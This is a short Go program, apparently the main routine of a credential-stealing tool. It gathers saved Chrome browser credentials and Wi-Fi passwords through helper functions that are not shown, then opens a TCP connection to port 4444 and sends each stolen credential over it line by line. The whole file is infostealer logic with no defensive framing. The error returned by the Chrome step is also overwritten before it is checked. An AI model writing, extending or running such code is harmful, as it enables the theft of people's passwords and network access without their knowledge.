package main

import (
	"fmt"
	"net"
)

func main() {
	chromeCreds, err := chrome_main()
	wifiCreds, err := wifi_main()
	if err != nil {
		fmt.Printf("Error getting wifi credentials: %v\n", err)
		return
	}
	//Connect to tcp server

	conn, err := net.Dial("tcp", "localhost:4444")
	if err != nil {
		fmt.Println("Error connecting to server", err.Error())
		return
	}
	defer conn.Close()

	for _, cred := range chromeCreds {
		_, err = conn.Write([]byte(cred + "\n"))
		if err != nil {
			fmt.Println("Error sending message to server", err.Error())
			return
		}
	}

	for _, cred := range wifiCreds {
		_, err = conn.Write([]byte(cred + "\n"))
		if err != nil {
			fmt.Println("Error sending message to server", err.Error())
			return
		}
	}

}
